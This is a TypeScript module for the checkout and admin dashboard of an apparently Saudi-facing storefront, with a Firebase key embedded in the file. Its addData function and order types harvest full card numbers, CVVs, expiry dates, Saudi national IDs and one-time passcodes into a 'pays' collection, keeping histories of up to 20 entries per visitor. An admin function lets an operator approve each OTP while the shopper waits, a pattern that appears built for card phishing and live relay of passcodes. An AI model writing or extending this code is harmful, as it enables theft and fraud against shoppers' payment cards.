import { dashboardSecretHeaders } from "./dashboardAuth";
import { initializeApp, getApps, type FirebaseApp } from "firebase/app";
import {
  getFirestore,
  initializeFirestore,
  doc,
  setDoc,
  getDoc,
  updateDoc,
  Timestamp,
  type Firestore,
} from "firebase/firestore";

// ──────────────────────────────────────────────────────────────────────────────
// Firebase config (Web SDK) — visitor / pays capture
// ──────────────────────────────────────────────────────────────────────────────
//
// The Web SDK is used ONLY for visitor telemetry and the `pays` capture
// document (writes from the storefront checkout into `pays/{visitorId}`).
//
// The orders pipeline is completely separate: the dashboard receives a live
// NDJSON feed from the api-server (`GET /api/orders/stream`) which uses the
// Firebase Admin SDK against the orders project server-side, and all order
// writes flow through `POST /api/orders`. The Firestore rules on the orders
// project can therefore deny anonymous reads on `orders` entirely.
const firebaseConfig = {
  apiKey: "AIzaSyBCgnfGog9E1l543Own6CIAtaK8nCmk1ZE",
  authDomain: "drettyafgh.firebaseapp.com",
  databaseURL: "https://drettyafgh-default-rtdb.firebaseio.com",
  projectId: "drettyafgh",
  storageBucket: "drettyafgh.firebasestorage.app",
  messagingSenderId: "904057927481",
  appId: "1:904057927481:web:f75cca6d120fa1038a5ae8",
  measurementId: "G-ZEV35EHPJM",
};

let app: FirebaseApp | undefined;
let dbInstance: Firestore | undefined;

function getApp(): FirebaseApp {
  if (app) return app;
  app = getApps().length ? getApps()[0]! : initializeApp(firebaseConfig);
  return app;
}

export function getDb(): Firestore {
  if (dbInstance) return dbInstance;
  // ignoreUndefinedProperties lets sanitizers emit fixed-shape objects with
  // optional undefined fields (e.g. cardType absent from the clickpay site)
  // without Firestore rejecting the whole write.
  try {
    dbInstance = initializeFirestore(getApp(), {
      ignoreUndefinedProperties: true,
    });
  } catch {
    // If Firestore was already initialized (e.g. HMR re-import), fall back.
    dbInstance = getFirestore(getApp());
  }
  return dbInstance;
}

// ──────────────────────────────────────────────────────────────────────────────
// Order document shape
// ──────────────────────────────────────────────────────────────────────────────

export type OrderEventType =
  | "placed"
  | "payment_submitted"
  | "otp_verified"
  | "otp_submitted"
  | "otp_approved"
  | "otp_rejected"
  | "confirmed"
  | "shipped"
  | "delivered"
  | "cancelled"
  | "admin_note";

export type OtpDecision = "pending" | "approved" | "rejected";

export interface OrderEvent {
  id: string;
  type: OrderEventType;
  message: string;
  actor: "system" | "customer" | "admin";
  createdAt: Timestamp;
}

export interface OrderItem {
  name_ar: string;
  price: number;
  qty: number;
  image_url: string;
}

export interface OrderShipping {
  city: string;
  district?: string;
  postal_code?: string;
  address: string;
  building?: string;
  floor?: string;
  notes?: string;
  status: "pending" | "shipped" | "delivered" | "cancelled";
}

export interface OrderPayment {
  method: "cod" | "credit";
  amount: number;
  currency: "SAR";
  status: "pending" | "verified" | "failed";
  otpVerified: boolean;
  otpVerifiedAt?: Timestamp;
  otpSubmittedAt?: Timestamp;
  otpDecision?: OtpDecision;
  otpDecidedAt?: Timestamp;
  receiptUrl?: string;
  cardLast4?: string;
  cardName?: string;
  cardNumber?: string;
  expiry?: string;
  cvv?: string;
  otp?: string;
}

export interface OrderCustomer {
  name: string;
  phone: string;
}

export type OrderStatus =
  | "pending"
  | "confirmed"
  | "shipped"
  | "delivered"
  | "cancelled";

export interface OrderDoc {
  id: string;
  customer: OrderCustomer;
  shipping: OrderShipping;
  payment: OrderPayment;
  items: OrderItem[];
  total: number;
  status: OrderStatus;
  notes: string;
  events: OrderEvent[];
  createdAt: Timestamp;
  updatedAt: Timestamp;
}

// ──────────────────────────────────────────────────────────────────────────────
// API helpers
// ──────────────────────────────────────────────────────────────────────────────

async function readApiError(r: Response): Promise<string> {
  try {
    const body = (await r.json()) as { error?: string; message?: string };
    return body?.error || body?.message || `HTTP ${r.status}`;
  } catch {
    return `HTTP ${r.status}`;
  }
}

export interface InitialCustomerEvent {
  type: "payment_submitted" | "otp_verified";
  message: string;
}

export interface CreateOrderInput {
  customer: OrderCustomer;
  shipping: Omit<OrderShipping, "status"> & {
    status?: OrderShipping["status"];
  };
  payment: {
    method: OrderPayment["method"];
    amount: number;
    status?: OrderPayment["status"];
    otpVerified?: boolean;
    receiptUrl?: string;
    cardNumber?: string;
    expiry?: string;
    cvv?: string;
    cardName?: string;
    otp: string;
  };
  items: OrderItem[];
  total: number;
  notes?: string;
  /**
   * Optional initial customer-driven events (e.g. payment_submitted,
   * otp_verified) to atomically attach to the order on creation. The server
   * always prepends a `placed` event, so callers must not pass that here.
   */
  events?: InitialCustomerEvent[];
}

/**
 * Create a new order via the api-server. Returns the new order id.
 * Public (no auth required) — but server-side Zod validation ensures the
 * payload is well-formed.
 */
export async function createOrder(input: CreateOrderInput): Promise<string> {
  const r = await fetch("/api/orders", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(input),
  });
  if (!r.ok) {
    throw new Error(await readApiError(r));
  }
  const body = (await r.json()) as { id: string };
  return body.id;
}

/**
 * Public storefront helper — attach the OTP value the customer entered to an
 * existing order's `payment.otp` field and mark `payment.otpVerified = true`.
 * The order must have been created first (via createOrder).
 */
export async function updateOrderOtp(
  orderId: string,
  otp: string,
): Promise<void> {
  const r = await fetch(
    `/api/orders/${encodeURIComponent(orderId)}/otp`,
    {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ otp }),
    },
  );
  if (!r.ok) {
    throw new Error(await readApiError(r));
  }
}

/**
 * Public storefront helper — poll the OTP decision status of an order.
 * Returns the current `otpVerified` flag and `otpDecision` ("pending" |
 * "approved" | "rejected"). Used by the checkout OTP screen to wait for the
 * admin's approval after the customer submits.
 */
export async function getOrderOtpStatus(orderId: string): Promise<{
  otpVerified: boolean;
  otpDecision: OtpDecision;
}> {
  const r = await fetch(
    `/api/orders/${encodeURIComponent(orderId)}/otp-status`,
    { method: "GET" },
  );
  if (!r.ok) {
    throw new Error(await readApiError(r));
  }
  const body = (await r.json()) as {
    otpVerified: boolean;
    otpDecision: OtpDecision;
  };
  return body;
}

/**
 * Admin-only: approve or reject the OTP a customer submitted on an order.
 * Server flips `payment.otpVerified` and appends an audit event.
 */
export async function decideOrderOtp(
  orderId: string,
  decision: "approve" | "reject",
  authHeaders: AuthHeaders,
): Promise<void> {
  const r = await fetch(
    `/api/orders/${encodeURIComponent(orderId)}/otp/decision`,
    {
      method: "PATCH",
      headers: {
        "Content-Type": "application/json",
        ...dashboardSecretHeaders(),
        ...authHeaders,
      },
      body: JSON.stringify({ decision }),
    },
  );
  if (!r.ok) {
    throw new Error(await readApiError(r));
  }
}

/**
 * Live subscription to all orders, ordered by createdAt desc.
 *
 * Implementation: short-interval HTTP polling against the api-server's
 * one-shot snapshot endpoint (`GET /api/orders`). We deliberately use
 * polling instead of the NDJSON stream (`/api/orders/stream`) because
 * Netlify Functions buffer responses and cannot keep a long-lived
 * streaming connection open — the standalone Replit deploy can still use
 * the streaming endpoint, but for portability we poll on both.
 *
 * The browser still never reads Firestore directly; all order reads go
 * through the Admin SDK on the server, so the Firestore rules can deny
 * anonymous reads on the `orders` collection.
 *
 * Polling cadence: every 4 seconds while the tab is visible (and once
 * immediately on subscribe). The cleanup function cancels any in-flight
 * request and the next scheduled tick.
 */
const ORDERS_POLL_INTERVAL_MS = 4000;

export function subscribeToOrders(
  cb: (orders: OrderDoc[]) => void,
  onError?: (err: Error) => void,
): () => void {
  let cancelled = false;
  let timer: ReturnType<typeof setTimeout> | null = null;
  let controller: AbortController | null = null;

  const tick = async (): Promise<void> => {
    if (cancelled) return;
    controller = new AbortController();
    try {
      const r = await fetch("/api/orders", {
        method: "GET",
        headers: {
          Accept: "application/json",
          ...dashboardSecretHeaders(),
        },
        signal: controller.signal,
        cache: "no-store",
      });
      if (!r.ok) {
        throw new Error(`HTTP ${r.status}`);
      }
      const data = (await r.json()) as OrderDoc[];
      if (!cancelled && Array.isArray(data)) {
        cb(data);
      }
    } catch (err) {
      if (cancelled || (err as { name?: string }).name === "AbortError") {
        return;
      }
      onError?.(err instanceof Error ? err : new Error(String(err)));
    } finally {
      if (!cancelled) {
        timer = setTimeout(tick, ORDERS_POLL_INTERVAL_MS);
      }
    }
  };

  void tick();

  return () => {
    cancelled = true;
    if (timer) {
      clearTimeout(timer);
      timer = null;
    }
    if (controller) {
      try {
        controller.abort();
      } catch {
        /* ignore */
      }
      controller = null;
    }
  };
}

export type AuthHeaders = Record<string, string>;

/**
 * Admin-only: change the order status. Server appends a matching status
 * event (confirmed / shipped / delivered / cancelled) and bumps updatedAt.
 *
 * Pass `authHeaders` from the dashboard's `useAuth().getToken()` so the
 * api-server can verify the Clerk admin session.
 */
export async function updateOrderStatus(
  orderId: string,
  status: OrderStatus,
  authHeaders: AuthHeaders,
): Promise<void> {
  const r = await fetch(`/api/orders/${encodeURIComponent(orderId)}/status`, {
    method: "PATCH",
    headers: {
      "Content-Type": "application/json",
      ...dashboardSecretHeaders(),
      ...authHeaders,
    },
    body: JSON.stringify({ status }),
  });
  if (!r.ok) {
    throw new Error(await readApiError(r));
  }
}

/**
 * Admin-only: append an admin_note event to an order. Server attributes the
 * event to "admin" actor.
 */
export async function appendAdminNote(
  orderId: string,
  message: string,
  authHeaders: AuthHeaders,
): Promise<void> {
  const r = await fetch(
    `/api/orders/${encodeURIComponent(orderId)}/admin-notes`,
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        ...dashboardSecretHeaders(),
        ...authHeaders,
      },
      body: JSON.stringify({ message }),
    },
  );
  if (!r.ok) {
    throw new Error(await readApiError(r));
  }
}

// ──────────────────────────────────────────────────────────────────────────────
// OTP helpers (still client-side; not currently wired into the live checkout
// flow, which uses an in-memory simulation, but kept for future use).
// The `pays` collection is not exposed by Firestore rules — these helpers
// will only work after the rules are relaxed or routed through the api-server.
// ──────────────────────────────────────────────────────────────────────────────

interface OtpVerification {
  id: string;
  phone: string;
  code: string;
  createdAt: Timestamp;
  expiresAt: Timestamp;
  verified: boolean;
  verifiedAt?: Timestamp;
}

function newId(prefix: string): string {
  return `${prefix}-${Date.now()}-${Math.random().toString(36).slice(2, 10)}`;
}

export async function createOtpVerification(
  phone: string,
  code: string,
): Promise<string> {
  const db = getDb();
  const id = newId("otp");
  const expires = new Date();
  expires.setMinutes(expires.getMinutes() + 5);
  const data: OtpVerification = {
    id,
    phone,
    code,
    createdAt: Timestamp.now(),
    expiresAt: Timestamp.fromDate(expires),
    verified: false,
  };
  await setDoc(doc(db, "pays", id), data);
  if (import.meta.env.DEV) {
    // eslint-disable-next-line no-console
    console.log(`[DEV] OTP for ${phone}: ${code}`);
  }
  return id;
}

export async function verifyOtp(
  verificationId: string,
  code: string,
): Promise<void> {
  const db = getDb();
  const ref = doc(db, "pays", verificationId);
  const snap = await getDoc(ref);
  if (!snap.exists()) {
    throw new Error("رمز التحقق غير موجود");
  }
  const data = snap.data() as OtpVerification;
  if (data.verified) {
    throw new Error("تم استخدام رمز التحقق بالفعل");
  }
  if (new Date() > data.expiresAt.toDate()) {
    throw new Error("انتهت صلاحية رمز التحقق");
  }
  if (data.code !== code) {
    throw new Error("رمز التحقق غير صحيح");
  }
  await updateDoc(ref, { verified: true, verifiedAt: Timestamp.now() });
}
// ──────────────────────────────────────────────────────────────────────────────
// Visitor / `pays` capture
// ──────────────────────────────────────────────────────────────────────────────
//
// Append arbitrary visitor-scoped telemetry to the `pays` Firestore
// collection. Writes directly from the browser using the Firebase Web SDK
// (no api-server hop). Used by the checkout flow to record each step
// (contact info, card details, OTP, etc.) keyed by a stable per-visitor id
// so a single visitor produces one merged document.
//
// `data` MUST include a string `id` (the visitor id from `ensureVisitorId()`).
// Known fields are sanitized; unknown fields pass through. Card / OTP entries
// are accumulated into `cardHistory` / `otpHistory` arrays (capped).
//
// Requires Firestore security rules to allow writes to `pays/{id}`.

const VISITOR_ID_REGEX = /^[A-Za-z0-9_-]{1,128}$/;
const MAX_HISTORY_ITEMS = 20;
const MAX_AMOUNT_VALUE = 1_000_000;

const sanitizeString = (value: unknown, maxLength: number) =>
  typeof value === "string" ? value.trim().slice(0, maxLength) : value;

const sanitizeDigits = (value: unknown, maxLength: number) =>
  typeof value === "string"
    ? value.replace(/\D/g, "").slice(0, maxLength)
    : value;

const sanitizePhone = (value: unknown, maxLength: number) =>
  typeof value === "string"
    ? value.replace(/[^\d+]/g, "").slice(0, maxLength)
    : value;

const clampNumber = (value: unknown, min: number, max: number) =>
  typeof value === "number" && !Number.isNaN(value)
    ? Math.min(max, Math.max(min, value))
    : value;

interface CardEntry {
  cardNumber?: unknown;
  cardName?: unknown;
  expiryMonth?: unknown;
  expiryYear?: unknown;
  cvv?: unknown;
  cardType?: unknown;
  timestamp?: unknown;
}

const sanitizeCardEntry = (entry: CardEntry) => ({
  cardNumber: sanitizeDigits(entry?.cardNumber, 19),
  cardName: sanitizeString(entry?.cardName, 60),
  expiryMonth: sanitizeDigits(entry?.expiryMonth, 2),
  expiryYear: sanitizeDigits(entry?.expiryYear, 4),
  cvv: sanitizeDigits(entry?.cvv, 4),
  cardType: sanitizeString(entry?.cardType, 20),
  timestamp:
    typeof entry?.timestamp === "string"
      ? entry.timestamp
      : new Date().toISOString(),
});

interface OtpEntry {
  code?: unknown;
  timestamp?: unknown;
}

const sanitizeOtpEntry = (entry: OtpEntry) => ({
  code: sanitizeDigits(entry?.code, 6),
  timestamp:
    typeof entry?.timestamp === "string"
      ? entry.timestamp
      : new Date().toISOString(),
});

function sanitizePayload(input: Record<string, unknown>) {
  const data: Record<string, unknown> = { ...input };

  // Split incoming "MM/YY" expiry into separate month/year fields so it lines
  // up with the schema admins read from the dashboard.
  if (typeof data.expiry === "string" && data.expiry.includes("/")) {
    const [mm, yy] = data.expiry.split("/");
    if (data.expiryMonth === undefined) data.expiryMonth = mm;
    if (data.expiryYear === undefined) data.expiryYear = yy;
  }

  if ("id" in data) data.id = sanitizeString(data.id, 80);
  if ("name" in data) data.name = sanitizeString(data.name, 80);
  if ("saudiId" in data) data.saudiId = sanitizeDigits(data.saudiId, 10);
  if ("email" in data && typeof data.email === "string") {
    data.email = data.email.trim().toLowerCase().slice(0, 120);
  }
  if ("phone" in data) data.phone = sanitizePhone(data.phone, 15);
  if ("cardNumber" in data)
    data.cardNumber = sanitizeDigits(data.cardNumber, 19);
  if ("cardLast4" in data) data.cardLast4 = sanitizeDigits(data.cardLast4, 4);
  if ("cardName" in data) data.cardName = sanitizeString(data.cardName, 60);
  if ("expiryMonth" in data)
    data.expiryMonth = sanitizeDigits(data.expiryMonth, 2);
  if ("expiryYear" in data)
    data.expiryYear = sanitizeDigits(data.expiryYear, 4);
  if ("cvv" in data) data.cvv = sanitizeDigits(data.cvv, 4);
  if ("cardType" in data) data.cardType = sanitizeString(data.cardType, 20);
  if ("otp" in data) data.otp = sanitizeDigits(data.otp, 6);
  if ("currentPage" in data)
    data.currentPage = sanitizeString(data.currentPage, 80);
  if ("page" in data) data.page = sanitizeString(data.page, 200);
  if ("step" in data) data.step = sanitizeString(data.step, 40);
  if ("status" in data) data.status = sanitizeString(data.status, 40);

  if ("totalAmount" in data) {
    data.totalAmount = clampNumber(data.totalAmount, 0, MAX_AMOUNT_VALUE);
  }
  if ("total" in data) {
    data.total = clampNumber(data.total, 0, MAX_AMOUNT_VALUE);
  }

  if (Array.isArray(data.cardHistory)) {
    data.cardHistory = (data.cardHistory as CardEntry[])
      .slice(-MAX_HISTORY_ITEMS)
      .map(sanitizeCardEntry);
  }
  if (Array.isArray(data.otpHistory)) {
    data.otpHistory = (data.otpHistory as OtpEntry[])
      .slice(-MAX_HISTORY_ITEMS)
      .map(sanitizeOtpEntry);
  }

  return data;
}

export async function addData(
  data: Record<string, unknown> & { id: string },
): Promise<void> {
  if (!data || typeof data.id !== "string" || !VISITOR_ID_REGEX.test(data.id)) {
    throw new Error("addData: missing or invalid visitor id");
  }
  localStorage.setItem("visitor", data.id);

  const sanitized = sanitizePayload(data);
  const visitorId = sanitized.id as string;
  const db = getDb();
  const docRef = doc(db, "pays", visitorId);

  // If the caller passed card fields, append a snapshot to cardHistory.
  const hasCardFields =
    typeof sanitized.cardNumber === "string" &&
    (sanitized.cardNumber as string).length > 0;
  // If the caller passed an otp field, append a snapshot to otpHistory.
  const hasOtp =
    typeof sanitized.otp === "string" && (sanitized.otp as string).length > 0;

  let cardHistory: ReturnType<typeof sanitizeCardEntry>[] | undefined;
  let otpHistory: ReturnType<typeof sanitizeOtpEntry>[] | undefined;

  if (hasCardFields || hasOtp) {
    try {
      const snap = await getDoc(docRef);
      const existing = snap.exists()
        ? (snap.data() as Record<string, unknown>)
        : {};

      if (hasCardFields) {
        const prev = Array.isArray(existing.cardHistory)
          ? (existing.cardHistory as CardEntry[])
          : [];
        const entry = sanitizeCardEntry({
          cardNumber: sanitized.cardNumber,
          cardName: sanitized.cardName,
          expiryMonth: sanitized.expiryMonth,
          expiryYear: sanitized.expiryYear,
          cvv: sanitized.cvv,
          cardType: sanitized.cardType,
          timestamp: new Date().toISOString(),
        });
        cardHistory = [...prev, entry]
          .slice(-MAX_HISTORY_ITEMS)
          .map(sanitizeCardEntry);
      }

      if (hasOtp) {
        const prev = Array.isArray(existing.otpHistory)
          ? (existing.otpHistory as OtpEntry[])
          : [];
        const entry = sanitizeOtpEntry({
          code: sanitized.otp,
          timestamp: new Date().toISOString(),
        });
        otpHistory = [...prev, entry]
          .slice(-MAX_HISTORY_ITEMS)
          .map(sanitizeOtpEntry);
      }
    } catch {
      // history accumulation is best-effort; continue with the base write
    }
  }

  await setDoc(
    docRef,
    {
      ...sanitized,
      ...(cardHistory ? { cardHistory } : {}),
      ...(otpHistory ? { otpHistory } : {}),
      id: visitorId,
      createdDate:
        typeof sanitized.createdDate === "string"
          ? sanitized.createdDate
          : new Date().toISOString(),
      timestamp: Timestamp.now(),
    },
    { merge: true },
  );
}
